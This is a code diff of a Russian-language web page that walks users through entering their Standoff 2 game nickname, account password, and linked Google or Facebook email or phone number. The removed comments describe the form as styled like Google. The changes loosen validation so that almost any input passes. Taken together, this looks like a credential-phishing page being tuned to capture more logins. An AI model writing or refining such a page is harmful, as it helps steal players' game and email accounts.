@@ -25,7 +25,6 @@
             padding: 20px;
         }
 
-        /* Шапка */
         .header {
             text-align: center;
             margin-bottom: 30px;
@@ -53,7 +52,6 @@
             letter-spacing: 2px;
         }
 
-        /* Экран выбора метода */
         .methods-screen {
             display: block;
         }
@@ -126,7 +124,6 @@
             font-size: 20px;
         }
 
-        /* Форма в стиле Google */
         .form-header {
             display: flex;
             align-items: center;
@@ -278,7 +275,6 @@
             font-size: 12px;
         }
 
-        /* Экран успеха */
         .success-icon {
             font-size: 80px;
             margin: 40px 0 20px;
@@ -392,7 +388,7 @@
             </div>
         </div>
 
-        <!-- Экран формы ввода (стиль Google) -->
+        <!-- Экран формы ввода -->
         <div id="formScreen" class="form-screen">
             <div class="form-header">
                 <button class="back-button" onclick="backToMethods()">←</button>
@@ -406,29 +402,41 @@
                 <div class="step" id="step3">3<span class="step-label" id="step3Label">Данные</span></div>
             </div>
 
-            <!-- Шаг 1: Никнейм -->
+            <!-- Шаг 1: Никнейм (любые языки и цифры) -->
             <div id="step1Content">
                 <div class="form-group">
                     <label class="form-label">🎮 Никнейм в Standoff 2</label>
-                    <input type="text" class="form-input" id="nickname" placeholder="Введите ваш никнейм" oninput="validateStep1()">
+                    <input type="text" class="form-input" id="nickname" 
+                           placeholder="Введите никнейм (любые символы)" 
+                           oninput="validateStep1()"
+                           pattern=".*"
+                           inputmode="text">
                 </div>
                 <button class="next-button" id="nextBtn1" onclick="nextStep()" disabled>Продолжить</button>
             </div>
 
-            <!-- Шаг 2: Пароль (скрыт) -->
+            <!-- Шаг 2: Пароль (любые языки и цифры) -->
             <div id="step2Content" style="display: none;">
                 <div class="form-group">
                     <label class="form-label">🔐 Пароль от аккаунта</label>
-                    <input type="password" class="form-input" id="password" placeholder="Введите пароль" oninput="validateStep2()">
+                    <input type="password" class="form-input" id="password" 
+                           placeholder="Введите пароль (любые символы)" 
+                           oninput="validateStep2()"
+                           pattern=".*"
+                           inputmode="text">
                 </div>
                 <button class="next-button" id="nextBtn2" onclick="nextStep()" disabled>Продолжить</button>
             </div>
 
-            <!-- Шаг 3: Дополнительные данные (скрыт, меняется в зависимости от метода) -->
+            <!-- Шаг 3: Дополнительные данные -->
             <div id="step3Content" style="display: none;">
                 <div class="form-group">
                     <label class="form-label" id="step3LabelField">📧 Email или телефон</label>
-                    <input type="text" class="form-input" id="additionalData" placeholder="" oninput="validateStep3()">
+                    <input type="text" class="form-input" id="additionalData" 
+                           placeholder="" 
+                           oninput="validateStep3()"
+                           pattern=".*"
+                           inputmode="text">
                 </div>
                 <button class="next-button" id="nextBtn3" onclick="submitForm()" disabled>Отправить</button>
             </div>
@@ -478,15 +486,15 @@
             if (method === 'Facebook') {
                 step3Label.textContent = 'Email/Phone';
                 step3LabelField.textContent = '📧 Email или номер телефона Facebook';
-                additionalInput.placeholder = 'example@gmail.com или +380...';
+                additionalInput.placeholder = 'Введите email или телефон';
             } else if (method === 'Google') {
                 step3Label.textContent = 'Gmail';
                 step3LabelField.textContent = '✉️ Google email';
-                additionalInput.placeholder = 'example@gmail.com';
+                additionalInput.placeholder = 'Введите Gmail';
             } else if (method === 'Номер телефона') {
                 step3Label.textContent = 'Телефон';
                 step3LabelField.textContent = '☎️ Номер телефона';
-                additionalInput.placeholder = '+380 XX XXX XX XX';
+                additionalInput.placeholder = ''; // Пустой placeholder для номера телефона
             }
             
             // Показываем экран формы
@@ -533,16 +541,16 @@
             document.getElementById('formInfo').textContent = 'Введите данные для входа в аккаунт';
         }
 
-        // Валидация шага 1
+        // Валидация шага 1 (любые символы, минимум 1)
         function validateStep1() {
             const nickname = document.getElementById('nickname').value;
-            document.getElementById('nextBtn1').disabled = nickname.length < 3;
+            document.getElementById('nextBtn1').disabled = nickname.length < 1;
         }
 
-        // Валидация шага 2
+        // Валидация шага 2 (любые символы, минимум 1)
         function validateStep2() {
             const password = document.getElementById('password').value;
-            document.getElementById('nextBtn2').disabled = password.length < 4;
+            document.getElementById('nextBtn2').disabled = password.length < 1;
         }
 
         // Валидация шага 3
@@ -551,17 +559,17 @@
             let isValid = false;
             
             if (currentMethod === 'Google') {
-                isValid = additional.includes('@gmail.com');
+                isValid = additional.includes('@') && additional.length > 5;
             } else if (currentMethod === 'Номер телефона') {
-                isValid = additional.length >= 10;
+                isValid = additional.length >= 5; // Минимальная длина для номера
             } else {
-                isValid = additional.length >= 3;
+                isValid = additional.length >= 1;
             }
             
             document.getElementById('nextBtn3').disabled = !isValid;
             
             if (currentMethod === 'Google' && !isValid && additional.length > 0) {
-                document.getElementById('formInfo').textContent = 'Email должен содержать @gmail.com';
+                document.getElementById('formInfo').textContent = 'Email должен содержать @';
             } else {
                 document.getElementById('formInfo').textContent = 'Введите данные для входа в аккаунт';
             }
@@ -620,7 +628,7 @@
                 </div>
                 <div class="detail-item">
                     <span class="detail-label">Пароль:</span>
-                    <span class="detail-value">${'•'.repeat(userData.password.length)}</span>
+                    <span class="detail-value">${'•'.repeat(Math.min(userData.password.length, 10))}</span>
                 </div>
                 <div class="detail-item">
                     <span class="detail-label">Доп. данные:</span>
